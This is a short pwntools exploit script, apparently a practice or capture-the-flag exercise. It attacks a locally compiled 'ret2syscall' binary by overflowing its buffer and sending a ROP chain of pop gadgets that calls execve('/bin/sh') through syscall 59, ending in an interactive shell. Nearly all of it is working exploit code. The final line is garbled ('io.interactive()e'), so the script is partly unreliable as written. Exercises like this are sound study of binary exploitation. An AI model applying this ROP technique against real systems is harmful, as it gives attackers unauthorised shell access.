# gcc -static -o ret2syscall ret2syscall.c -no-pie -fno-stack-protector

from pwn import *		
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './ret2syscall'
io=process(pwnfile)	# ,aslr = False


def debug():
	gdb.attach(io)
	pause()

bin_sh = 0x04C60F0	

pop_rax = 0x0000000000450087
pop_rdi = 0x0000000000401f2f
pop_rsi = 0x0000000000409f5e
pop_rdx_rbx = 0x0000000000485eab

syscall = 0x0000000000401ce4

# rax 
#syscall(59,'/bin/sh',0,0) 	xecve('/bin/sh',NULL,NULL)
# read  write



debug()

pay = b'a'*8+p64(0xdeadbeef)
pay += p64(pop_rdi)+p64(bin_sh)+p64(pop_rsi)+p64(0)+p64(pop_rdx_rbx)+p64(0)+p64(0)+p64(pop_rax)+p64(59)+p64(syscall)

io.sendlineafter("input:\n",pay)

io.interactive()e
